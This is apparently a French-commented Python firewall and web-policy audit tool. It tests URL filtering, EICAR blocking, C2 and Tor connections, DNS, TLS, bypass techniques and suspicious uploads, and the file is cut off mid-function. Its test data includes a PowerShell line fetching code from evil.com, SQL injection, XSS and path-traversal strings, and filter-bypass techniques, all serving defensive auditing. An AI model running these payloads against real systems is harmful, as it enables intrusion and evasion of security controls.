#!/usr/bin/env python3
"""
FirewallTester v3.0 — Firewall & Web Policy Audit Tool
Cross-platform Windows / Linux
Features: TUI interactif, proxy auto-detect + auth, 100+ URL tests,
          graphiques HTML (camembert + barres), config client, recommandations
"""

import sys, os, json, socket, ssl, datetime, platform, argparse, time, re, base64
import urllib.request
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[ERROR] 'requests' manquant. Lancez : pip install requests")
    sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════════════
# CONSTANTES
# ═══════════════════════════════════════════════════════════════════════════════

VERSION   = "3.0.0"
TIMEOUT   = 8
NEUTRAL_CATS = ("neutral", "valid", "neutral_ua")

CATEGORY_META = {
    "adult":         {"label": "🔞 Adult / Pornography",       "color": "#f472b6", "severity": "critical"},
    "social_media":  {"label": "💬 Social Media",              "color": "#818cf8", "severity": "minor"},
    "crypto":        {"label": "₿  Cryptocurrency",            "color": "#fbbf24", "severity": "major"},
    "gambling":      {"label": "🎰 Gambling",                  "color": "#fb923c", "severity": "major"},
    "streaming":     {"label": "🎬 Streaming / Média",         "color": "#34d399", "severity": "minor"},
    "cloud_pro":     {"label": "☁️  Cloud Storage Pro",        "color": "#60a5fa", "severity": "minor"},
    "ai_llm":        {"label": "🤖 IA / LLM",                  "color": "#a78bfa", "severity": "minor"},
    "darkweb":       {"label": "🕸️  Dark Web Adjacent",        "color": "#6b7280", "severity": "critical"},
    "malware":       {"label": "☣️  Malware / Threats",        "color": "#ef4444", "severity": "critical"},
    "phishing":      {"label": "🎣 Phishing",                  "color": "#f97316", "severity": "critical"},
    "hacking_tools": {"label": "🛠️  Hacking Tools",            "color": "#c084fc", "severity": "major"},
    "anonymizer":    {"label": "🧅 Anonymizers",               "color": "#6ee7b7", "severity": "major"},
    "vpn":           {"label": "🔐 VPN",                       "color": "#38bdf8", "severity": "major"},
    "data_exfil":    {"label": "📤 Data Exfiltration",         "color": "#fb7185", "severity": "critical"},
    "file_sharing":  {"label": "📂 File Sharing",              "color": "#a3e635", "severity": "minor"},
    "neutral":       {"label": "✅ Neutral Baselines",         "color": "#4ade80", "severity": "none"},
}

RECOMMENDATIONS = {
    "adult":         ("Activer le filtrage de contenu adulte",             "La catégorie Adult/Pornography n'est pas bloquée. Ce type de contenu expose l'entreprise à des risques légaux (harcèlement, environnement de travail) et de productivité."),
    "social_media":  ("Restreindre ou surveiller les réseaux sociaux",     "Les réseaux sociaux non filtrés augmentent le risque de phishing, de fuite de données et de perte de productivité."),
    "crypto":        ("Bloquer les plateformes de crypto-monnaies",        "Les exchanges crypto sont des vecteurs de cryptojacking et de violation des politiques financières internes."),
    "gambling":      ("Bloquer les sites de jeux d'argent",               "Les sites de gambling sont illégaux en contexte professionnel dans de nombreux pays et exposent l'employeur à une responsabilité."),
    "streaming":     ("Restreindre les plateformes de streaming",          "Le streaming non encadré consomme de la bande passante et augmente les risques de contenu inapproprié."),
    "ai_llm":        ("Définir une politique d'usage des IA génératives",  "L'accès non contrôlé aux LLM (ChatGPT, etc.) peut entraîner des fuites de données sensibles ou confidentielles."),
    "darkweb":       ("Bloquer les sites dark web / anonymisation",        "L'accès à des sites dark web adjacent indique un risque d'exfiltration ou d'activité malveillante."),
    "malware":       ("Activer le filtrage de malwares en temps réel",     "Des URL catégorisées malware sont accessibles. Le pare-feu ne bloque pas les menaces connues."),
    "phishing":      ("Activer l'anti-phishing sur le proxy/pare-feu",    "Des pages de phishing connues sont accessibles depuis le réseau."),
    "hacking_tools": ("Bloquer les sites d'outils offensifs",             "Les sites type Exploit-DB ou Shodan accessibles depuis le réseau augmentent la surface d'attaque interne."),
    "anonymizer":    ("Bloquer les proxies et anonymiseurs web",           "Les anonymiseurs permettent de contourner toutes les autres politiques de filtrage."),
    "vpn":           ("Contrôler l'usage des VPN",                        "Des VPN externes non maîtrisés peuvent créer des tunnels chiffrés contournant la politique de sécurité."),
    "data_exfil":    ("Bloquer les sites de partage de données anonymes",  "Pastebin, transfer.sh et similaires sont des canaux classiques d'exfiltration de données."),
}

# ═══════════════════════════════════════════════════════════════════════════════
# TESTS
# ═══════════════════════════════════════════════════════════════════════════════

URL_FILTER_TESTS = [
    # ── Malware / Threats ──────────────────────────────────────────────────────
    ("URLhaus API",               "http://urlhaus-api.abuse.ch/v1/",           "malware"),
    ("WiCAR malware test",        "https://www.wicar.org/test-malware.html",   "malware"),
    ("Ransomware.org",            "https://ransomware.org",                     "malware"),
    ("Malc0de exploit kit",       "https://malc0de.com",                        "malware"),
    ("Malwarebytes blog",         "https://www.malwarebytes.com/blog",          "malware"),
    # ── Phishing ──────────────────────────────────────────────────────────────
    ("PhishTank",                 "https://phishtank.org/",                     "phishing"),
    ("OpenPhish feed",            "https://openphish.com/feed.txt",             "phishing"),
    # ── Adult / Pornography ───────────────────────────────────────────────────
    ("Pornhub",                   "https://www.pornhub.com",                    "adult"),
    ("xvideos",                   "https://www.xvideos.com",                    "adult"),
    ("xhamster",                  "https://xhamster.com",                       "adult"),
    ("Redtube",                   "https://www.redtube.com",                    "adult"),
    ("YouPorn",                   "https://www.youporn.com",                    "adult"),
    ("OnlyFans",                  "https://onlyfans.com",                       "adult"),
    ("Brazzers",                  "https://www.brazzers.com",                   "adult"),
    ("LiveJasmin",                "https://www.livejasmin.com",                 "adult"),
    ("Chaturbate",                "https://chaturbate.com",                     "adult"),
    ("MyFreeCams",                "https://www.myfreecams.com",                 "adult"),
    ("BongaCams",                 "https://bongacams.com",                      "adult"),
    ("Stripchat",                 "https://stripchat.com",                      "adult"),
    # ── Gambling ──────────────────────────────────────────────────────────────
    ("gambling.com",              "https://www.gambling.com",                   "gambling"),
    ("PokerStars",                "https://www.pokerstars.com",                 "gambling"),
    ("Betclic",                   "https://www.betclic.fr",                     "gambling"),
    ("Winamax",                   "https://www.winamax.fr",                     "gambling"),
    ("Unibet",                    "https://www.unibet.fr",                      "gambling"),
    ("PMU",                       "https://www.pmu.fr",                         "gambling"),
    ("Parions Sport FDJ",         "https://www.parionssport.fdj.fr",            "gambling"),
    ("Bet365",                    "https://www.bet365.com",                     "gambling"),
    # ── Social Media ──────────────────────────────────────────────────────────
    ("TikTok",                    "https://www.tiktok.com",                     "social_media"),
    ("Instagram",                 "https://www.instagram.com",                  "social_media"),
    ("WhatsApp Web",              "https://web.whatsapp.com",                   "social_media"),
    ("Telegram Web",              "https://web.telegram.org",                   "social_media"),
    ("Telegram CDN",              "https://desktop.telegram.org",               "social_media"),
    ("Snapchat",                  "https://www.snapchat.com",                   "social_media"),
    ("Discord",                   "https://discord.com",                        "social_media"),
    ("Twitter / X",               "https://twitter.com",                        "social_media"),
    ("Facebook",                  "https://www.facebook.com",                   "social_media"),
    ("Reddit",                    "https://www.reddit.com",                     "social_media"),
    ("Pinterest",                 "https://www.pinterest.com",                  "social_media"),
    ("Twitch",                    "https://www.twitch.tv",                      "social_media"),
    ("BeReal",                    "https://bere.al",                            "social_media"),
    ("Mastodon",                  "https://mastodon.social",                    "social_media"),
    ("LinkedIn",                  "https://www.linkedin.com",                   "social_media"),
    ("Signal",                    "https://signal.org",                         "social_media"),
    # ── Streaming / Media ─────────────────────────────────────────────────────
    ("YouTube",                   "https://www.youtube.com",                    "streaming"),
    ("Netflix",                   "https://www.netflix.com",                    "streaming"),
    ("Disney+",                   "https://www.disneyplus.com",                 "streaming"),
    ("Prime Video",               "https://www.primevideo.com",                 "streaming"),
    ("Spotify",                   "https://www.spotify.com",                    "streaming"),
    ("Deezer",                    "https://www.deezer.com",                     "streaming"),
    ("Dailymotion",               "https://www.dailymotion.com",                "streaming"),
    ("Canal+",                    "https://www.canalplus.com",                  "streaming"),
    ("Molotov TV",                "https://www.molotov.tv",                     "streaming"),
    ("Apple TV+",                 "https://tv.apple.com",                       "streaming"),
    # ── Cloud Storage Pro ─────────────────────────────────────────────────────
    ("SharePoint Online",         "https://sharepoint.com",                     "cloud_pro"),
    ("OneDrive",                  "https://onedrive.live.com",                  "cloud_pro"),
    ("Box",                       "https://www.box.com",                        "cloud_pro"),
    ("Dropbox",                   "https://www.dropbox.com",                    "cloud_pro"),
    ("Google Drive",              "https://drive.google.com",                   "cloud_pro"),
    ("iCloud",                    "https://www.icloud.com",                     "cloud_pro"),
    ("Nextcloud demo",            "https://demo.nextcloud.com",                 "cloud_pro"),
    ("pCloud",                    "https://www.pcloud.com",                     "cloud_pro"),
    # ── IA / LLM ──────────────────────────────────────────────────────────────
    ("ChatGPT / OpenAI",          "https://chat.openai.com",                    "ai_llm"),
    ("Claude (Anthropic)",        "https://claude.ai",                          "ai_llm"),
    ("Google Gemini",             "https://gemini.google.com",                  "ai_llm"),
    ("Microsoft Copilot",         "https://copilot.microsoft.com",              "ai_llm"),
    ("Mistral AI",                "https://chat.mistral.ai",                    "ai_llm"),
    ("Perplexity AI",             "https://www.perplexity.ai",                  "ai_llm"),
    ("Hugging Face",              "https://huggingface.co",                     "ai_llm"),
    ("Grok (xAI)",                "https://grok.x.ai",                         "ai_llm"),
    # ── Dark Web Adjacent ─────────────────────────────────────────────────────
    ("Ahmia (Tor search)",        "https://ahmia.fi",                           "darkweb"),
    ("The Hidden Wiki mirror",    "https://thehiddenwiki.org",                  "darkweb"),
    ("Dark.fail",                 "https://dark.fail",                          "darkweb"),
    ("ZeroNet",                   "https://zeronet.io",                         "darkweb"),
    ("I2P Project",               "https://geti2p.net",                         "darkweb"),
    ("Freenet Project",           "https://freenetproject.org",                 "darkweb"),
    # ── Crypto ────────────────────────────────────────────────────────────────
    ("Coinbase",                  "https://www.coinbase.com",                   "crypto"),
    ("Binance",                   "https://www.binance.com",                    "crypto"),
    ("Kraken",                    "https://www.kraken.com",                     "crypto"),
    ("Bybit",                     "https://www.bybit.com",                      "crypto"),
    ("OKX",                       "https://www.okx.com",                        "crypto"),
    ("KuCoin",                    "https://www.kucoin.com",                     "crypto"),
    ("Bitget",                    "https://www.bitget.com",                     "crypto"),
    ("Etherscan",                 "https://etherscan.io",                       "crypto"),
    ("CoinMarketCap",             "https://coinmarketcap.com",                  "crypto"),
    ("LocalBitcoins",             "https://localbitcoins.com",                  "crypto"),
    # ── Hacking / Security Tools ──────────────────────────────────────────────
    ("Exploit-DB",                "https://www.exploit-db.com",                 "hacking_tools"),
    ("Shodan",                    "https://www.shodan.io",                      "hacking_tools"),
    ("Kali Linux",                "https://www.kali.org",                       "hacking_tools"),
    ("HackForums",                "https://hackforums.net",                     "hacking_tools"),
    ("0day.today",                "https://0day.today",                         "hacking_tools"),
    # ── Anonymizers / VPN / Proxy ─────────────────────────────────────────────
    ("Tor Project",               "https://www.torproject.org",                 "anonymizer"),
    ("hide.me proxy",             "https://hide.me/en/proxy",                   "anonymizer"),
    ("ProxySite",                 "https://www.proxysite.com",                  "anonymizer"),
    ("NordVPN",                   "https://nordvpn.com",                        "vpn"),
    ("Mullvad",                   "https://mullvad.net",                        "vpn"),
    ("Proton VPN",                "https://protonvpn.com",                      "vpn"),
    ("ExpressVPN",                "https://www.expressvpn.com",                 "vpn"),
    # ── Data Exfiltration ─────────────────────────────────────────────────────
    ("Pastebin",                  "https://pastebin.com",                       "data_exfil"),
    ("rentry.co",                 "https://rentry.co",                          "data_exfil"),
    ("transfer.sh",               "https://transfer.sh",                        "data_exfil"),
    ("gofile.io",                 "https://gofile.io",                          "data_exfil"),
    # ── File Sharing ──────────────────────────────────────────────────────────
    ("WeTransfer",                "https://wetransfer.com",                     "file_sharing"),
    ("Mega.nz",                   "https://mega.nz",                            "file_sharing"),
    ("Mediafire",                 "https://www.mediafire.com",                  "file_sharing"),
    # ── Neutral baselines ─────────────────────────────────────────────────────
    ("Google",                    "https://www.google.com",                     "neutral"),
    ("Microsoft",                 "https://www.microsoft.com",                  "neutral"),
    ("Wikipedia",                 "https://www.wikipedia.org",                  "neutral"),
    ("GitHub",                    "https://www.github.com",                     "neutral"),
]

EICAR_TESTS = [
    ("EICAR .com (HTTP)",         "http://www.eicar.org/download/eicar.com",               "eicar"),
    ("EICAR .txt (HTTPS)",        "https://www.eicar.org/download/eicar.com.txt",          "eicar"),
    ("EICAR .zip single",         "https://www.eicar.org/download/eicar_com.zip",          "eicar_zip"),
    ("EICAR .zip double",         "https://www.eicar.org/download/eicarcom2.zip",          "eicar_zip"),
    ("WiCAR JS crypto miner",     "https://www.wicar.org/data/javascript_crypto_miner.html","wicar"),
    ("WiCAR PDF exploit",         "https://www.wicar.org/data/ms14_064_ole_code_execution.pdf","wicar"),
]

C2_IP_TESTS = [
    ("Sinkhole Shadowserver",     "198.199.123.17",   80,   "c2_sinkhole"),
    ("Known bad abuse.ch",        "91.92.109.3",      80,   "c2"),
    ("TOR Exit Node #1",          "176.10.104.240",   9001, "tor"),
    ("TOR Exit Node #2",          "185.220.101.1",    9001, "tor"),
    ("Bogon RFC6598",             "100.64.0.1",       80,   "bogon"),
    ("Loopback bypass",           "127.0.0.1",        8080, "loopback"),
    ("IRC C2 port 6667",          "irc.undernet.org", 6667, "irc_c2"),
    ("Telnet port 23",            "telnet.lwp.io",    23,   "telnet"),
    ("RDP external 3389",         "scanme.nmap.org",  3389, "rdp_exposure"),
    ("SMB external 445",          "scanme.nmap.org",  445,  "smb_external"),
]

DNS_TESTS = [
    ("Malware domain WiCAR",      "malware.wicar.org",           "malicious"),
    ("Phishing category",         "phishing.testcategory.com",   "phishing"),
    ("DGA random domain",         "asjdhaksjdhaksjdh12839.com",  "dga"),
    ("Typosquatting google",      "gooogle.com",                 "typosquat"),
    ("Typosquatting microsoft",   "micosoft.com",                "typosquat"),
    ("DoH Cloudflare",            "cloudflare-dns.com",          "doh_bypass"),
    ("DoH Google",                "dns.google",                  "doh_bypass"),
    ("DoH Quad9",                 "dns.quad9.net",               "doh_bypass"),
    ("Adult domain",              "www.pornhub.com",             "adult"),
    ("Dark web Ahmia",            "ahmia.fi",                    "darkweb"),
    ("Normal google.com",         "www.google.com",              "neutral"),
    ("Normal microsoft.com",      "www.microsoft.com",           "neutral"),
]

SSL_TESTS = [
    ("Valid cert Google",         "www.google.com",              443,  "valid"),
    ("Valid cert Microsoft",      "www.microsoft.com",           443,  "valid"),
    ("Expired cert",              "expired.badssl.com",          443,  "expired"),
    ("Self-signed cert",          "self-signed.badssl.com",      443,  "self_signed"),
    ("Wrong host cert",           "wrong.host.badssl.com",       443,  "wrong_host"),
    ("Untrusted root",            "untrusted-root.badssl.com",   443,  "untrusted_root"),
    ("Revoked cert",              "revoked.badssl.com",          443,  "revoked"),
    ("Weak cipher RC4",           "rc4.badssl.com",              443,  "weak_cipher"),
    ("Weak cipher 3DES",          "3des.badssl.com",             443,  "weak_cipher"),
    ("TLS 1.0",                   "tls-v1-0.badssl.com",         1010, "old_tls"),
    ("TLS 1.1",                   "tls-v1-1.badssl.com",         1011, "old_tls"),
    ("HTTP no encryption",        "http.badssl.com",             80,   "no_tls"),
]

APP_LAYER_TESTS = [
    ("UA sqlmap scanner",         "https://www.google.com", "GET", {"User-Agent":"sqlmap/1.7"}, None, True,  "scanner_ua",    "SQLi scanner UA"),
    ("UA Nikto scanner",          "https://www.google.com", "GET", {"User-Agent":"Nikto/2.1.6"}, None, True, "scanner_ua",    "Web scanner UA"),
    ("UA curl normal",            "https://www.google.com", "GET", {"User-Agent":"curl/7.88.0"}, None, False,"neutral_ua",    "Legitimate curl"),
    ("SQLi in URL",               "https://www.google.com/search?q=1'+OR+'1'%3D'1", "GET", {}, None, True,  "sqli_attempt",  "SQLi payload"),
    ("XSS in URL",                "https://www.google.com/search?q=<script>alert(1)</script>", "GET", {}, None, True, "xss_attempt", "XSS payload"),
    ("Path traversal",            "https://www.google.com/../../../etc/passwd", "GET", {}, None, True, "path_traversal","Dir traversal"),
]


# ═══════════════════════════════════════════════════════════════════════════════
# NOUVEAUX MODULES DE TEST
# ═══════════════════════════════════════════════════════════════════════════════

# ── Bypass / Contournement ────────────────────────────────────────────────────
# Techniques pour tester si le filtrage est contournable
# (name, url_or_domain, technique, expected_blocked, description)
BYPASS_TESTS = [
    # IP directe (contourne le filtrage DNS)
    ("IP directe Pornhub",        "https://66.254.114.41",         "direct_ip",     True,  "Accès via IP directe sans résolution DNS"),
    ("IP directe XVideos",        "https://185.88.181.8",          "direct_ip",     True,  "Accès via IP directe sans résolution DNS"),
    ("IP directe Binance",        "https://104.20.23.46",          "direct_ip",     True,  "Accès via IP directe sans résolution DNS"),
    # Sous-domaines alternatifs
    ("Sous-domaine m. TikTok",    "https://m.tiktok.com",          "subdomain",     True,  "Version mobile — même catégorie"),
    ("Sous-domaine www2",         "https://www2.online-casino.de", "subdomain",     True,  "Sous-domaine alternatif gambling"),
    ("Sous-domaine cdn Discord",  "https://cdn.discordapp.com",    "subdomain",     True,  "CDN Discord souvent oublié dans les règles"),
    ("Sous-domaine api Twitter",  "https://api.twitter.com",       "subdomain",     True,  "API Twitter/X contourne le filtrage web"),
    # Encodage URL (bypass filtrage par string matching)
    ("URL encode Pornhub",        "https://www.pornhub%2Ecom",     "url_encode",    True,  "Encodage du point — contourne filtres naïfs"),
    ("Double encode slash",       "https://www.google.com/%2F%2Fwww.pornhub.com", "url_encode", True, "Double encodage redirect"),
    # Majuscules dans le hostname
    ("Majuscules PornHub",        "https://www.PornHub.com",       "case_bypass",   True,  "Hostname en majuscules — contourne filtres case-sensitive"),
    ("Majuscules TIKTOK",         "https://www.TikTok.com",        "case_bypass",   True,  "Hostname mixte majuscules/minuscules"),
    # Base64 dans le path (test WAF/IPS)
    ("Base64 payload GET",        "https://www.google.com/search?q=cGFzc3dvcmQ=", "base64", True, "Payload base64 dans param — détection IPS"),
]

# ── Protocoles alternatifs ─────────────────────────────────────────────────────
# (name, host, port, protocol, expected_blocked, description)
PROTOCOL_TESTS = [
    # FTP
    ("FTP standard port 21",      "ftp.dlptest.com",    21,   "ftp",       True,  "FTP sortant — doit être bloqué en entreprise"),
    ("FTP alternatif port 2121",  "ftp.dlptest.com",    2121, "ftp_alt",   True,  "FTP sur port non standard"),
    # SSH / SFTP
    ("SSH port 22",               "scanme.nmap.org",    22,   "ssh",       True,  "SSH sortant — tunnel potentiel"),
    ("SSH port alternatif 2222",  "scanme.nmap.org",    2222, "ssh_alt",   True,  "SSH sur port non standard"),
    # MQTT (IoT)
    ("MQTT broker port 1883",     "test.mosquitto.org", 1883, "mqtt",      True,  "MQTT non chiffré — vecteur IoT C2"),
    ("MQTT TLS port 8883",        "test.mosquitto.org", 8883, "mqtt_tls",  True,  "MQTT chiffré — doit être bloqué si non autorisé"),
    # WebSocket
    ("WebSocket ws:// port 80",   "ws.ifelse.io",       80,   "websocket", True,  "WebSocket non chiffré"),
    ("WebSocket wss:// port 443", "ws.ifelse.io",       443,  "wss",       False, "WebSocket TLS — trafic légitime possible"),
    # Autres
    ("IMAP port 143",             "imap.gmail.com",     143,  "imap",      True,  "IMAP sortant — exfiltration email"),
    ("SMTP port 25",              "smtp.gmail.com",     25,   "smtp",      True,  "SMTP direct sortant — spam/exfil"),
]

# ── Ports non standard ────────────────────────────────────────────────────────
# (name, host, port, category, expected_blocked, description)
NON_STANDARD_PORT_TESTS = [
    # HTTP alternatifs
    ("HTTP alt port 8080",        "scanme.nmap.org",    8080,  "http_alt",  True,  "HTTP sur 8080 — souvent non filtré"),
    ("HTTP alt port 8888",        "scanme.nmap.org",    8888,  "http_alt",  True,  "HTTP sur 8888"),
    ("HTTP alt port 3128",        "scanme.nmap.org",    3128,  "proxy_port",True,  "Port proxy Squid — accès direct suspect"),
    ("HTTP alt port 8000",        "scanme.nmap.org",    8000,  "http_alt",  True,  "HTTP dev server port"),
    # HTTPS alternatifs
    ("HTTPS alt port 8443",       "scanme.nmap.org",    8443,  "https_alt", True,  "HTTPS sur 8443 — contourne filtres HTTPS"),
    ("HTTPS alt port 4443",       "scanme.nmap.org",    4443,  "https_alt", True,  "HTTPS sur 4443"),
    # Base de données exposées
    ("MySQL port 3306",           "scanme.nmap.org",    3306,  "db_port",   True,  "MySQL exposé — accès BDD direct interdit"),
    ("PostgreSQL port 5432",      "scanme.nmap.org",    5432,  "db_port",   True,  "PostgreSQL exposé"),
    ("Redis port 6379",           "scanme.nmap.org",    6379,  "db_port",   True,  "Redis exposé — souvent sans auth"),
    ("MongoDB port 27017",        "scanme.nmap.org",    27017, "db_port",   True,  "MongoDB exposé"),
    # Divers
    ("Elasticsearch 9200",        "scanme.nmap.org",    9200,  "db_port",   True,  "Elasticsearch — index de données"),
    ("Kubernetes API 6443",       "scanme.nmap.org",    6443,  "infra_port",True,  "API Kubernetes exposée"),
]

# ── Exfiltration DNS ──────────────────────────────────────────────────────────
# (name, query, qtype, expected_blocked, description)
DNS_EXFIL_TESTS = [
    ("DNS TXT record (data exfil)", "whoami.akamai.net",          "TXT",  False, "TXT query — vecteur exfil classique"),
    ("DNS AAAA exfil simulation",   "ipv6.google.com",            "AAAA", False, "Query AAAA — tunnel IPv6 DNS"),
    ("DNS long subdomain (DGA)",    "a"*50+".example.com",        "A",    True,  "Subdomain 50 chars — DGA/tunnel DNS"),
    ("DNS tunnel simulé",           "dnscat.example.com",         "TXT",  True,  "Domaine typique outil tunnel DNS"),
    ("DNS rebinding test",          "make-1.2.3.4-rebind.me",     "A",    True,  "DNS rebinding — attaque navigateur"),
]

# ── Upload de fichier suspect ─────────────────────────────────────────────────
# (name, url, filename, content, mimetype, expected_blocked, description)
UPLOAD_TESTS = [
    # content_bytes générés dynamiquement pour éviter les bytes null dans le source
    ("Upload EICAR via POST",       "https://httpbin.org/post",
     "eicar.exe",
     b"X5O!P%@AP[4" + b"\\PZX54(P^)7CC)7}" + b"$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
     "application/octet-stream", True,  "Upload binaire EICAR — doit être bloqué par DLP"),
    ("Upload .exe générique",       "https://httpbin.org/post",
     "malware.exe",
     bytes([0x4D,0x5A,0x90,0x03,0x00,0x00,0x00]),
     "application/x-msdownload",   True,  "Upload PE header — signature EXE Windows"),
    ("Upload script PS1",           "https://httpbin.org/post",
     "payload.ps1",
     b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com')",
     "text/plain",                 True,  "PowerShell download — pattern malveillant"),
    ("Upload fichier texte normal", "https://httpbin.org/post",
     "rapport.txt",
     b"Rapport de test firewall - contenu anodin",
     "text/plain",                 False, "Upload texte innocent — ne doit PAS être bloqué"),
]

# ── Bandwidth / QoS ──────────────────────────────────────────────────────────
# (name, url, min_speed_kbps, category, description)
BANDWIDTH_TESTS = [
    ("Speed test 1MB",     "https://speed.cloudflare.com/__down?bytes=1000000",  100, "speed",     "Téléchargement 1MB — vitesse de base"),
    ("Speed test 10MB",    "https://speed.cloudflare.com/__down?bytes=10000000", 500, "speed",     "Téléchargement 10MB — détection throttling"),
    ("YouTube throttle",   "https://rr1---sn-gvbxgn-tt1e.googlevideo.com",       50,  "streaming", "CDN YouTube — QoS/throttling streaming"),
    ("Speedtest.net API",  "https://www.speedtest.net/api/js/servers",            50,  "speed",     "API Speedtest — baseline réseau"),
]

# ═══════════════════════════════════════════════════════════════════════════════
# PROXY DETECTION
# ═══════════════════════════════════════════════════════════════════════════════

def detect_system_proxy():
    """Détecte le proxy système (env vars + winreg sur Windows)."""
    for var in ("HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy"):
        v = os.environ.get(var, "")
        if v:
            return v
    if platform.system() == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Internet Settings")
            enabled, _ = winreg.QueryValueEx(key, "ProxyEnable")
            if enabled:
                server, _ = winreg.QueryValueEx(key, "ProxyServer")
                if server:
                    if not server.startswith("http"):
                        server = "http://" + server
                    return server
        except Exception:
            pass
    return None

def build_proxies(cfg_proxy):
    """Construit le dict proxies pour requests."""
    if not cfg_proxy.get("enabled"):
        sys_proxy = detect_system_proxy()
        if sys_proxy:
            return {"http": sys_proxy, "https": sys_proxy}
        return {}
    url = cfg_proxy.get("url", "").strip()
    if not url:
        return {}
    user = cfg_proxy.get("username", "").strip()
    pw   = cfg_proxy.get("password", "").strip()
    if user and pw:
        from urllib.parse import urlparse, urlunparse
        p = urlparse(url)
        url = urlunparse(p._replace(netloc=f"{user}:{pw}@{p.netloc}"))
    return {"http": url, "https": url}

# ═══════════════════════════════════════════════════════════════════════════════
# TEST RUNNERS
# ═══════════════════════════════════════════════════════════════════════════════

PROXIES = {}  # injecté au runtime

def _get(url, **kw):
    return requests.get(url, timeout=TIMEOUT, verify=False,
                        proxies=PROXIES,
                        headers={"User-Agent": "FirewallTester/3.0"},
                        allow_redirects=True, **kw)

def run_url_test(name, url, category):
    r = {"name":name,"url":url,"category":category,
         "status":None,"http_code":None,"blocked":False,"details":"","duration_ms":0}
    t0 = time.time()
    try:
        resp = _get(url)
        r["http_code"] = resp.status_code
        if resp.status_code in (407,451,503):
            r["blocked"]=True; r["details"]=f"HTTP {resp.status_code} — Proxy/FW block"
        else:
            r["details"]=f"HTTP {resp.status_code} — Reachable"
    except requests.exceptions.ConnectionError:
        r["blocked"]=True; r["details"]="Connection refused / blocked"
    except requests.exceptions.Timeout:
        r["blocked"]=True; r["details"]="Timeout — likely blocked"
    except Exception as e:
        r["status"]="error"; r["details"]=str(e)[:80]
    r["status"] = "blocked" if r["blocked"] else "reachable"
    r["duration_ms"] = round((time.time()-t0)*1000)
    return r

def run_eicar_test(name, url, category):
    r = {"name":name,"url":url,"category":category,
         "status":None,"blocked":False,"details":"","duration_ms":0}
    t0 = time.time()
    SIG = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    try:
        resp = requests.get(url, timeout=TIMEOUT, verify=False, stream=True,
                            proxies=PROXIES, headers={"User-Agent":"FirewallTester/3.0"})
        content = b""
        for chunk in resp.iter_content(4096):
            content += chunk
            if len(content) > 512: break
        if SIG in content:
            r["details"]="⚠️  EICAR reçu — NON bloqué"
        else:
            r["blocked"]=True; r["details"]="Payload absent — bloqué"
    except requests.exceptions.ConnectionError:
        r["blocked"]=True; r["details"]="Connexion refusée — bloqué"
    except requests.exceptions.Timeout:
        r["blocked"]=True; r["details"]="Timeout — bloqué"
    except Exception as e:
        r["status"]="error"; r["details"]=str(e)[:80]
    r["status"] = "blocked" if r["blocked"] else "not_blocked"
    r["duration_ms"] = round((time.time()-t0)*1000)
    return r

def run_c2_test(name, ip, port, category):
    r = {"name":name,"ip":ip,"port":port,"category":category,
         "status":None,"blocked":False,"details":"","duration_ms":0}
    t0 = time.time()
    try:
        sock = socket.create_connection((ip, port), timeout=TIMEOUT)
        sock.close()
        r["details"]=f"TCP {ip}:{port} — NOT blocked"
    except ConnectionRefusedError:
        r["blocked"]=True; r["status"]="refused"; r["details"]="Refused — possibly blocked"
    except socket.timeout:
        r["blocked"]=True; r["status"]="timeout"; r["details"]="Timeout — firewalled"
    except OSError as e:
        r["blocked"]=True; r["status"]="blocked"; r["details"]=f"OS error: {e}"
    r["status"] = r["status"] or ("blocked" if r["blocked"] else "reachable")
    r["duration_ms"] = round((time.time()-t0)*1000)
    return r

def run_dns_test(name, domain, category):
    r = {"name":name,"domain":domain,"category":category,
         "status":None,"blocked":False,"resolved_ips":[],"details":"","duration_ms":0}
    t0 = time.time()
    SINKHOLES = {"0.0.0.0","127.0.0.1","::1","146.112.61.106","52.2.4.6","74.82.42.42"}
    try:
        addrs = socket.getaddrinfo(domain, None)
        ips = list(set(a[4][0] for a in addrs))
        r["resolved_ips"] = ips
        sinkholed = any(ip in SINKHOLES for ip in ips)
        if category == "neutral":
            r["details"]=f"Résolu → {ips}"
        elif sinkholed:
            r["blocked"]=True; r["details"]=f"Sinkholed → {ips}"
        else:
            r["details"]=f"Résolu → {ips} — NON filtré"
    except socket.gaierror:
        r["blocked"]=True; r["details"]="NXDOMAIN / refusé — DNS filtering actif"
    except Exception as e:
        r["status"]="error"; r["details"]=str(e)[:80]
    r["status"] = r["status"] or ("blocked" if r["blocked"] else "resolved")
    r["duration_ms"] = round((time.time()-t0)*1000)
    return r

def run_ssl_test(name, host, port, category):
    r = {"name":name,"host":host,"port":port,"category":category,
         "status":None,"blocked":False,"cert_info":{},"details":"","duration_ms":0}
    t0 = time.time()
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.create_connection((host,port),timeout=TIMEOUT),
                             server_hostname=host) as s:
            cert = s.getpeercert(); cipher = s.cipher()
            r["cert_info"] = {"version":s.version(),"cipher":cipher[0] if cipher else "?"}
            if category == "valid":
                r["details"]=f"Valide — {s.version()} / {cipher[0] if cipher else '?'}"
            else:
                r["details"]=f"⚠️  Mauvais cert accepté ({category})"
    except ssl.SSLCertVerificationError as e:
        r["blocked"]=True; r["status"]="cert_error"; r["details"]=f"SSL verify: {e.reason}"
    except ssl.SSLError as e:
        r["blocked"]=True; r["status"]="ssl_error"; r["details"]=f"SSL: {e}"
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        r["blocked"]=True; r["status"]="conn_error"; r["details"]=f"Connexion: {e}"
    r["status"] = r["status"] or ("blocked" if r["blocked"] else "ok")
    r["duration_ms"] = round((time.time()-t0)*1000)
    return r

def run_app_layer_test(name, url, method, headers_extra, body, expected_blocked, category, description):
    r = {"name":name,"url":url,"category":category,"description":description,
         "status":None,"blocked":False,"http_code":None,"details":"","duration_ms":0}
    t0 = time.time()
    hdrs = {"User-Agent":"FirewallTester/3.0"}; hdrs.update(headers_extra)
    try:
        fn = requests.get if method=="GET" else requests.post
        resp = fn(url, timeout=TIMEOUT, verify=False, headers=hdrs,
                  proxies=PROXIES, data=body, allow_redirects=True)
